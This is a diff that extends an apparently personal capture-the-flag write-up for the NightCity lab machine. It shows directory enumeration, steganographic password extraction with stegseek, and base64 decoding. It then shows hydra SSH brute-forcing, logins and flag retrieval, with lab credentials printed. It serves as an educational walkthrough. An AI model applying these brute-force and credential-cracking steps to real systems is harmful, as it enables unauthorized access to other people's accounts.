@@ -106,7 +106,350 @@ Local user is in the coordinates
 
 
 ---I check the website and see the user waidroc, when we click we go to his github repo and we discover every user's credentials
-therefore ending the CTF :) But I will continue and finish this ctf as the way the creator intended to---
+therefore ending the CTF :) But I'ma continue and finish this ctf the way the creator of the machine intended us to do so---
 
----This page will be updated---
+                  
+
+
+---we got one more clue, let's continue with gobuster---
+
+
+ 
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.68 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,txt,php
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.68
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 274]
+/index.html           (Status: 200) [Size: 8407]
+/images               (Status: 301) [Size: 307] [--> http://10.0.2.68/images/]
+/contact.html         (Status: 200) [Size: 6349]
+/about.html           (Status: 200) [Size: 7744]
+/gallery.html         (Status: 200) [Size: 8768]
+/js                   (Status: 301) [Size: 303] [--> http://10.0.2.68/js/]
+/robots.txt           (Status: 200) [Size: 136]
+/secret               (Status: 301) [Size: 307] [--> http://10.0.2.68/secret/]
+/robin                (Status: 200) [Size: 1873]
+/.html                (Status: 403) [Size: 274]
+/server-status        (Status: 403) [Size: 274]
+Progress: 882240 / 882244 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                              
+
+
+
+---check the /secret directory and discover 3 photos, I download them and will check them later---
+
+
+
+---visit http://10.0.2.68/robots.txt---
+
+
+#Good Job
+
+To continue, you need a workmate. Our lastest news is that Robin is close to
+NightCity. Try to find him, Robin has the key!!
+
+
+---got one more clue, let's check the page /robin---
+
+
+
+---there's a story about current situation in the city, it is in spanish, I download it into the directory and then translate it
+to discover some clues maybe, after all robin has the key---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/38- NIGHTCITY LINUX CTF]
+└─# ls
+city.txt         nightcity_linux_os_ctf_writeup.txt  veryImportant.jpg
+most-wanted.jpg  some-light.jpg
+                                             
+
+
+
+---I look at this pictures and decide to check them one by one, I will 
+
+
+
+---however this doesn't work, let's look around for some other clues---
+
+
+
+---I decide to use stegseek--- 
+
+
+Stegseek: A fast and efficient tool used for cracking steganographic data hidden in jpeg and other image files using steghide
+
+
+---On the most-wanted.jpg we find something---
+
+                                                                                                    
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/38- NIGHTCITY LINUX CTF]
+└─# stegseek -wl /home/okina/wordlists/rockyou.txt most-wanted.jpg 
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "japon")           
+[i] Original filename: "pass.txt".
+[i] Extracting to "most-wanted.jpg.out".
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/38- NIGHTCITY LINUX CTF]
+└─# cat most-wanted.jpg.out           
+VGhpc0lzVGhlUmVhbFBhc3N3MHJkIQ==
+      
+
+
+---looks like base64 encryption---
+
+                                                                                                    
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/38- NIGHTCITY LINUX CTF]
+└─# cat most-wanted.jpg.out| base64 -d
+ThisIsTheRealPassw0rd!                                                                                                    
+
+
+---here we get a password---
+
+
+
+---I want to create two lists using the usernames and passwords we discovered so far and will then crack the login credentials
+using hydra---
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/38- NIGHTCITY LINUX CTF]
+└─# cat users.txt                
+batman
+robin
+nightwing
+joker
+jason
+tim
+dick
+
+
+---it's a reference to gotham city so I put the most known characters---
+
+                                                                                                    
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/38- NIGHTCITY LINUX CTF]
+└─# cat passwords.txt 
+ThisIsTheRealPassw0rd!                                                                                                    
+
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/38- NIGHTCITY LINUX CTF]
+└─# hydra -L users.txt -P passwords.txt ssh://10.0.2.68
+                                                                                                    
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/38- NIGHTCITY LINUX CTF]
+└─# hydra -L users.txt -P passwords.txt ssh://10.0.2.68 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-29 21:05:26
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:4/p:1), ~1 try per task
+[DATA] attacking ssh://10.0.2.68:22/
+
+[22][ssh] host: 10.0.2.68   login: batman   password: ThisIsTheRealPassw0rd!
+
+
+---got our login credentials---
+
+
+
+
+
+
+			GAINING FOOTHOLD
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/38- NIGHTCITY LINUX CTF]
+└─# ssh batman@10.0.2.68                                                 
+batman@10.0.2.68's password: 
+
+ _   _ _       _     _    ____ _ _         
+| \ | (_) __ _| |__ | |_ / ___(_) |_ _   _ 
+|  \| | |/ _` | '_ \| __| |   | | __| | | |
+| |\  | | (_| | | | | |_| |___| | |_| |_| |
+|_| \_|_|\__, |_| |_|\__|\____|_|\__|\__, |
+         |___/                       |___/ 
+
+***  NightCityCTF © 2022 by Waidroc & Cillo31 is licensed under CC BY-NC-SA 4.0.  ***
+              ***  https://www.github.com/Waidroc/NightCityCTF ***                   
+
+Welcome to Ubuntu 18.04.6 LTS (5.4.0-150-generic).
+
+System information as of: Wed May 29 19:55:22 CEST 2024
+
+System Load:	0.00	IP Address:	
+Memory Usage:	7.5%	System Uptime:	1:02 hours
+Usage On /:	61%	Swap Usage:	0.0%
+Local Users:	1	Processes:	128
+
+50 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Last login: Tue May 28 13:43:29 2024 from 10.0.2.54
+batman@NightCity:~$ ls
+flag.txt  iknowyou.jpg
+
+batman@NightCity:~$ cat flag.txt 
+Nice try! but, this is not the flag. You have to keep working >:)
+
+
+---we are in as batman, but we can't access the flag.txt yet---
+
+
+---on the machine page it says the user flag is the password of the first user that accessed the system 
+so---
+
+
+
+password_of_batsy
+---First User Flag---
+
+
+
+---we see the file iknowyou.jpg, let's download and inspect it---
+
+                                                                                                    
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/38- NIGHTCITY LINUX CTF]
+└─# scp batman@10.0.2.68:~/iknowyou.jpg iknowyou.jpg
+
+batman@10.0.2.68's password: 
+iknowyou.jpg                                                      100%  266KB   7.8MB/s   00:00    
+  
+
+
+---I check the content of the file using strings and stegseek but can't find that much--- 
+
+---I decide to download the pic to my own machine manually, it is a dark picture so I increase the 
+brightness of it, then I see a writing on the chimney---  
+
+
+ThatMadeMeL4ugh!
+
+
+
+---I add this to the passwords.txt and try again to see if any user has this password---
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/38- NIGHTCITY LINUX CTF]
+└─# hydra -L users.txt -P passwords.txt ssh://10.0.2.68
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-29 21:15:41
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:4/p:2), ~1 try per task
+[DATA] attacking ssh://10.0.2.68:22/
+[22][ssh] host: 10.0.2.68   login: joker   password: ThatMadeMeL4ugh!
+[22][ssh] host: 10.0.2.68   login: batman   password: ThisIsTheRealPassw0rd!
+
+
+---we have two user credentials now---
+
+
+
+---now we can access as the user joker too---
+
+
+
+
+
+			
+			PRIVILEGE ESCALATION
+
+                  
+batman@NightCity:~$ su joker
+Contraseña: 
+
+joker@NightCity:/home/batman$ cd /home
+
+joker@NightCity:/home$ ls -la
+total 24
+drwxr-xr-x  6 root          root          4096 jun  9  2022 .
+drwxr-xr-x 24 root          root          4096 may 28 13:56 ..
+drwxrwx--- 15 administrator administrator 4096 jun  9  2022 administrator
+drwxr-xr-x  3 root          root          4096 jun  9  2022 anonymous
+drwxr-xr-x  5 batman        batman        4096 jun 15  2022 batman
+drwxrwx---  2 joker         joker         4096 jun 13  2022 .joker
+joker@NightCity:/home$ cd .joker
+
+joker@NightCity:/home/.joker$ ls -la
+total 28
+drwxrwx--- 2 joker joker 4096 jun 13  2022 .
+drwxr-xr-x 6 root  root  4096 jun  9  2022 ..
+-rwxrwx--- 1 joker joker  220 jun  8  2022 .bash_logout
+-rwxrwx--- 1 joker joker 3771 jun  8  2022 .bashrc
+-rw-r--r-- 1 root  root  7157 jun  9  2022 flag.txt
+-rwxrwx--- 1 joker joker  807 jun  8  2022 .profile
+
+joker@NightCity:/home/.joker$ cat flag.txt 
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣤⣶⡶⠛⠉⠉⠀⣀⣀⣀⣤⣤⣤⣶⣶⣒⣛⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⡿⠋⢀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⡽⣟⣫⣭⣶⣶⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠙⠉⠁⠀⢿⣿⣿⣿⣿⡿⠿⠿⣿⡿⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡄⠀
+⠀⠀⠀⠀⠀⠀⣴⠃⠀⠀⠈⠻⠿⠿⠿⠿⠟⠛⠉⠁⠙⠿⠿⠛⠋⠉⠀⠀⠀⢀⣠⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣙⠻⢿⣿⣿⣿⣶⣶⣶⣦⣤⣤⣴⢶⣾⠟⠀⠀
+⠀⠀⠀⠀⠀⠰⡏⣴⣄⠀⠀⠀⠀⠀⢀⣠⣴⣤⣄⣀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡉⠙⠛⠛⠛⠛⠛⠉⣉⡴⢟⣡⣴⠏⠀
+⠀⠀⠀⠀⠀⠀⠳⣿⣿⣷⣦⣀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣶⡄⠀⣀⣶⣿⣿⡿⠿⠟⠛⠛⠛⠛⠛⠛⠛⠿⣿⣿⣿⣿⣿⣿⣶⠀⠀⠀⠀⣰⣾⣷⣾⣿⡿⠃⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣣⢞⣭⠿⠋⠁⠀⠀⠀⠀⠀⠀⠠⣤⣤⣶⣾⣿⣿⣿⣯⣭⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⢿⡿⣿⣿⣿⣿⣿⣿⣿⡵⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠉⠉⠛⠿⠿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣻⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⠟⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⣿⣿⣿⣿⣿⠟⠁⠀⣠⣶⣿⠇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠀⠈⠻⣿⣿⡏⠀⣰⠊⠱⠛⡆⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠈⠁⠀⠀⠀⠀⣀⣀⣠⠤⠶⠶⠿⣫⠟⠁⠀⠀⠀⠈⠻⣁⣼⠗⣿⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⣀⣀⣀⣀⣈⣷⠦⠤⠶⠖⠿⣭⣁⣀⣀⣠⣶⡾⠋⠀⠀⠀⠀⠀⠀⠀⠋⠁⢠⡇⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠶⣶⣾⣯⣍⣉⠉⠙⠛⣿⠁⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⠛⠀⠀⠀⠀⣤⣀⣀⠀⠀⢸⡄⠀⣠⡜⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡏⠉⠻⢷⣶⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠤⠤⢤⣄⣀⡀⠀⠀⠀⠀⠀⢿⠉⠁⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⢀⣀⣈⣼⠀⠀⠀⠀⠀⣀⣀⡴⠂⠉⠀⠀⠀⣠⢾⠁⠀⣽⠲⡄⠀⠀⠀⢸⡆⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⣴⣏⣁⠀⢻⠀⠀⢀⡴⣺⠝⠀⠀⠀⢀⣀⢶⠛⠁⠸⡄⠀⣿⠀⠹⠄⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⢙⠲⢄⡀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⢸⡇⠈⠻⣷⣾⠀⠀⣨⠟⣁⣀⣤⣴⠶⠋⠁⢸⠀⠀⠀⣷⠀⣿⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⢀⡟⠀⢸⠀⠀⠉⠒⠄
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡳⠀⠀⠙⢿⣀⡶⠉⣿⠉⠉⠉⣧⠀⠀⠀⢸⠀⠀⠀⣿⣠⣿⠀⠀⠀⠀⢀⣾⠇⠀⠀⠀⡼⠁⠀⡟⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠸⠿⣷⡀⠸⡀⠀⠀⠹⡄⠀⠀⠸⢀⣀⡴⠟⣿⠇⠀⠀⠀⠀⣾⡏⠀⠀⠀⣸⠃⠀⢰⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠀⠀⠀⠻⣧⣠⢧⡤⠤⠤⠿⣆⠀⠚⠉⣧⠀⢰⡿⠀⠀⠀⢀⣾⡟⠀⠀⠀⢠⠇⠀⠀⣸⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣀⣀⢀⣤⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⣾⠉⠀⠀⣷⠀⠀⠀⢻⡀⠀⠀⢻⠀⣿⠁⠀⠀⢠⣾⡿⠀⠀⠀⢠⡞⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀
+⠀⢰⣾⣿⠷⣿⣿⠵⠖⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠘⣆⠀⠀⣿⠀⠀⠀⠀⣧⠀⠀⣸⣾⠃⠀⠀⣠⣿⠟⠀⠀⠀⢀⡞⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀
+⠀⠈⡻⠉⠋⠉⢁⣤⣼⡏⢠⣆⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⣿⣶⣤⣼⣤⣀⣀⣀⡽⠶⣚⡿⠁⠀⢀⣾⣿⠋⠀⠀⠀⠀⡼⠁⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀
+⢰⣶⢟⡴⢾⢇⣏⣤⡿⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣦⠉⠉⠉⠉⠙⠛⠛⠋⠉⠉⠀⠀⣠⣿⣟⠁⠐⠒⠒⠶⡾⠁⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀
+⣸⣃⣽⣣⠜⠿⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠈⠳⡄⠀⠀⡼⠁⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀
+⠿⠉⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣳⡀⠀⠀⠀⠀⠀⢀⣴⠟⠧⣄⠀⠀⠀⠙⣦⡞⠁⠀⠀⠀⣀⣺⠴⠶⢲⡆⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣸⡏⠀⠀⠀⠀⣀⣴⡏⠀⠀⠀⠀⠀⠀⠀⢀⡠⠞⠉⠹⣄⠀⠀⠀⣠⠟⠁⠀⠀⠈⠓⣦⣀⣠⢟⠀⣠⠴⠞⠉⠁⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢠⣶⠏⢻⣶⡶⣾⣿⣟⡯⠞⠃⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠹⣄⣠⣞⠉⠉⠉⠉⠉⠓⠲⢶⠾⠶⢿⠋⠁⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀
+⠀⠀⠈⠀⠉⠉⣉⣻⠉⠉⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠉⠹⣆⠀⠀⠀⠀⠀⠀⠘⣦⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
+⠀⠀⢀⣠⣶⠋⡽⠃⠀⢀⣀⡴⠞⠀⠀⠀⠀⠀⣀⣠⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠀⠀⠀⠀⠈⣳⢶⣿⣀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀
+⠀⠀⠎⠀⣼⠋⠀⠰⢊⣯⡟⠀⢀⣀⡤⠶⠒⠉⠉⠁⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡄⠀⠀⠀⠀⢀⣾⠁⣸⠇⢹⠳⣄⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣯⢉⡶⡆⣸⡉⠓⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠹⡀⠀⠀⣰⠏⡾⠀⣿⠀⢸⠀⠈⣿⢦⡀⠀⢰⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢀⡿⠋⠁⠁⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢻⣀⡜⠁⢠⠇⠀⣧⠀⢸⠀⠀⡇⠀⠙⠲⡽⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠉⠀⠀⣿⠀⠀⣿⠀⢸⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⠀⠀⠀⠉⠉⠛⢿⡆⢸⡇⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠘⣧⡾⠃⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣄⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀
+
+           Good job!! You just discovered the criminal!
+
+
+
+
+---In the machine page it said the root flag is the password of the user who can view the flag.txt, so---
+
+
+
+password_of_heathledger
+---Root User Flag---
 
